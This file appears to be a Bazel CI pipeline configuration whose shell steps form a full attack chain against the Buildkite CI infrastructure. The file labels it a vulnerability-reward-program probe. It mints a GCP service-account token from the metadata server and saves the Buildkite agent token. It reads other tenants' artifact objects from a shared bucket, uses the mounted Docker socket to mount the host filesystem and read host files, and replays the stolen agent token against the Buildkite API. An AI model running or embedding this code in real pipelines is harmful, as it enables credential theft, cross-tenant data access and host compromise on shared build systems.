---
buildifier:
  version: latest
tasks:
  vrp_buildkite_full_chain:
    platform: ubuntu2204
    shell_commands:
      - |
        set +x
        echo VRP_BK_FULL_CHAIN_20260519
        id
        hostname
        uname -a
        echo "BUILDKITE_JOB_ID=$BUILDKITE_JOB_ID"
        echo "BUILDKITE_AGENT_ID=$BUILDKITE_AGENT_ID"
        echo "BUILDKITE_AGENT_NAME=$BUILDKITE_AGENT_NAME"
        echo "BUILDKITE_PIPELINE_ID=$BUILDKITE_PIPELINE_ID"
        echo "BUILDKITE_ARTIFACT_UPLOAD_DESTINATION=$BUILDKITE_ARTIFACT_UPLOAD_DESTINATION"
      - |
        set +x
        echo === STEP_1_TOKEN_MINT_BEGIN ===
        MD="http://metadata.google.internal/computeMetadata/v1"
        H="Metadata-Flavor: Google"
        TOK_JSON=$(curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/token)
        export TOK_JSON_PY="$TOK_JSON"
        python3 - <<'PY'
        import json, os
        try:
            d = json.loads(os.environ.get("TOK_JSON_PY",""))
            tok = d.get("access_token","")
        except Exception:
            tok = ""
        print(f"TOKEN_PRESENT={'yes' if tok else 'no'}")
        print(f"TOKEN_LENGTH={len(tok)}")
        if tok:
            with open("/tmp/.t","w") as f: f.write(tok)
            os.chmod("/tmp/.t", 0o600)
        PY
        export TOK_JSON_PY=""
        TOK_JSON=""
        # Also save the Buildkite agent token to a file for step 6.
        if [ -n "${BUILDKITE_AGENT_ACCESS_TOKEN:-}" ]; then
            printf '%s' "$BUILDKITE_AGENT_ACCESS_TOKEN" > /tmp/.bka
            chmod 600 /tmp/.bka
            echo "BUILDKITE_AGENT_TOKEN_STORED=yes len=$(wc -c < /tmp/.bka)"
        else
            echo "BUILDKITE_AGENT_TOKEN_MISSING"
        fi
        echo === STEP_1_TOKEN_MINT_END ===
      - |
        set +x
        echo === STEP_2_BUCKET_TEST_IAM_PERMISSIONS_BEGIN ===
        TOK=$(cat /tmp/.t)
        PERMS="permissions=storage.buckets.get&permissions=storage.buckets.list&permissions=storage.buckets.update&permissions=storage.objects.list&permissions=storage.objects.get&permissions=storage.objects.create&permissions=storage.objects.update&permissions=storage.objects.delete&permissions=storage.objects.setIamPolicy&permissions=storage.objects.getIamPolicy"
        echo "--- bucket=bazel-untrusted-buildkite-artifacts ---"
        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
            -H "Authorization: Bearer $TOK" \
            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/iam/testPermissions?$PERMS" \
            | head -c 4000
        echo
        TOK=""
        echo === STEP_2_BUCKET_TEST_IAM_PERMISSIONS_END ===
      - |
        set +x
        echo === STEP_3_SENTINEL_UPLOAD_AND_OWN_READ_BEGIN ===
        echo "VRP_OWN_ARTIFACT_PROBE_20260519 build=$BUILDKITE_BUILD_ID job=$BUILDKITE_JOB_ID" > /tmp/sentinel-vrp.txt
        echo "sentinel content uploaded:"
        cat /tmp/sentinel-vrp.txt
        buildkite-agent artifact upload /tmp/sentinel-vrp.txt 2>&1 | head -c 2000
        echo
        TOK=$(cat /tmp/.t)
        JOB=$BUILDKITE_JOB_ID
        for OBJ in "$JOB/tmp/sentinel-vrp.txt" "$JOB/sentinel-vrp.txt"; do
          enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$OBJ")
          echo "--- OWN object metadata: $OBJ ---"
          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
              -H "Authorization: Bearer $TOK" \
              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner,acl" \
              | head -c 2500
          echo
          echo "--- OWN object body (alt=media): $OBJ ---"
          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
              -H "Authorization: Bearer $TOK" \
              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
              | head -c 500
          echo
        done
        TOK=""
        echo === STEP_3_SENTINEL_UPLOAD_AND_OWN_READ_END ===
      - |
        set +x
        echo === STEP_4_CROSS_TENANT_OBJECT_READ_BEGIN ===
        TOK=$(cat /tmp/.t)
        # The smallest object we listed in PR #1067 was 716 bytes —
        # a buildfarm common-test attempt_1 log from 2020-12-18.
        # Reading its body in full proves storage.objects.get is granted
        # cross-tenant; the body content will be captured to evidence and
        # treated as confidential (not redistributed beyond the VRP report).
        for OBJ in \
            "000077c7-3328-4179-a619-31de827c4b9e/src\\test\\java\\build\\buildfarm\\common-tests\\attempt_1.log" \
            "0000698e-6969-401a-ac6e-9e1112f44131/src/test/shell/bazel/bazel_java_test/test.log"; do
          enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$OBJ")
          echo "--- CROSS-TENANT metadata: $OBJ ---"
          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
              -H "Authorization: Bearer $TOK" \
              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner,acl" \
              | head -c 3000
          echo
          echo "--- CROSS-TENANT body (alt=media, first 800 bytes): $OBJ ---"
          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
              -H "Authorization: Bearer $TOK" \
              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
              | head -c 800
          echo
          echo "--- end of object ---"
        done
        TOK=""
        echo === STEP_4_CROSS_TENANT_OBJECT_READ_END ===
      - |
        set +x
        echo === STEP_5_DOCKER_HOST_ESCAPE_BEGIN ===
        if [ ! -S /var/run/docker.sock ]; then
          echo DOCKER_SOCK_MISSING
        else
          # Use the host Docker daemon (bind-mounted socket) to create a
          # container with the host root filesystem read-only-mounted at
          # /host, then read /etc/hostname, /etc/os-release, and an
          # innocuous file from /var/lib/buildkite-agent (to prove the
          # agent home is reachable). Container is deleted after.
          echo "--- POST /images/create (ensure image present) ---"
          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 30 \
              -X POST \
              --unix-socket /var/run/docker.sock \
              "http://localhost/images/create?fromImage=gcr.io%2Fbazel-public%2Fubuntu2204&tag=latest" \
              | tail -c 400
          echo
          PAYLOAD='{"Image":"gcr.io/bazel-public/ubuntu2204","Cmd":["/bin/sh","-c","set -e; echo VRP_HOST_FS_READ_CONFIRMED; echo HOST_HOSTNAME=$(cat /host/etc/hostname); echo HOST_OS_RELEASE_FIRST3:; sed -n 1,3p /host/etc/os-release; echo HOST_BUILDKITE_AGENT_DIR_TOP:; ls -la /host/var/lib/buildkite-agent/ 2>&1 | head -c 600; echo HOST_BUILDKITE_AGENT_CONFIG_PRESENT=$(test -f /host/etc/buildkite-agent/buildkite-agent.cfg && echo yes || echo no)"],"HostConfig":{"Binds":["/:/host:ro"],"NetworkMode":"none","AutoRemove":false},"Tty":false,"AttachStdout":true,"AttachStderr":true}'
          echo "--- POST /containers/create ---"
          CREATE_RESP=$(curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
              --unix-socket /var/run/docker.sock \
              -H "Content-Type: application/json" \
              -X POST -d "$PAYLOAD" \
              "http://localhost/containers/create?name=vrp_probe_${BUILDKITE_JOB_ID}")
          echo "$CREATE_RESP" | head -c 2000
          echo
          CID=$(echo "$CREATE_RESP" | python3 -c "import sys,json,re;t=sys.stdin.read();
          m=re.search(r'\"Id\":\"([0-9a-f]+)\"',t);print(m.group(1) if m else '')")
          if [ -n "$CID" ]; then
            echo "CONTAINER_ID=$CID"
            echo "--- POST /containers/$CID/start ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
                --unix-socket /var/run/docker.sock \
                -X POST \
                "http://localhost/containers/$CID/start"
            echo
            echo "--- POST /containers/$CID/wait ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 30 \
                --unix-socket /var/run/docker.sock \
                -X POST \
                "http://localhost/containers/$CID/wait"
            echo
            echo "--- GET /containers/$CID/logs ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
                --unix-socket /var/run/docker.sock \
                "http://localhost/containers/$CID/logs?stdout=true&stderr=true&tail=200" \
                | head -c 4000
            echo
            echo "--- DELETE /containers/$CID ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
                --unix-socket /var/run/docker.sock \
                -X DELETE \
                "http://localhost/containers/$CID?force=true&v=true"
            echo
          else
            echo "CONTAINER_CREATE_FAILED"
          fi
        fi
        echo === STEP_5_DOCKER_HOST_ESCAPE_END ===
      - |
        set +x
        echo === STEP_6_BUILDKITE_AGENT_TOKEN_REPLAY_BEGIN ===
        if [ ! -f /tmp/.bka ]; then
          echo "AGENT_TOKEN_FILE_MISSING"
        else
            BKA=$(cat /tmp/.bka)
            # The Buildkite Agent API base is https://agent.buildkite.com/v3.
            # GET /v3/ping is the unauthenticated health endpoint.
            # GET /v3/jobs/<job_id> with Authorization: Token <agent_token>
            # is the agent-API "get job" call. A 200 with the job JSON
            # proves the agent token is a usable agent credential, not
            # just a string in the environment.
            echo "--- GET https://agent.buildkite.com/v3/ping (unauth, sanity) ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                "https://agent.buildkite.com/v3/ping" \
                | head -c 800
            echo
            echo "--- GET /v3/jobs/$BUILDKITE_JOB_ID (with agent token) ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                -H "Authorization: Token $BKA" \
                "https://agent.buildkite.com/v3/jobs/$BUILDKITE_JOB_ID" \
                | head -c 2000
            echo
            echo "--- POST /v3/heartbeats (with agent token, just heartbeat) ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                -X POST \
                -H "Authorization: Token $BKA" \
                "https://agent.buildkite.com/v3/heartbeats" \
                | head -c 800
            echo
            BKA=""
        fi
        echo === STEP_6_BUILDKITE_AGENT_TOKEN_REPLAY_END ===
      - |
        set +x
        echo === STEP_7_CLEANUP ===
        rm -f /tmp/.t /tmp/.bka /tmp/sentinel-vrp.txt
        echo VRP_BK_FULL_CHAIN_END
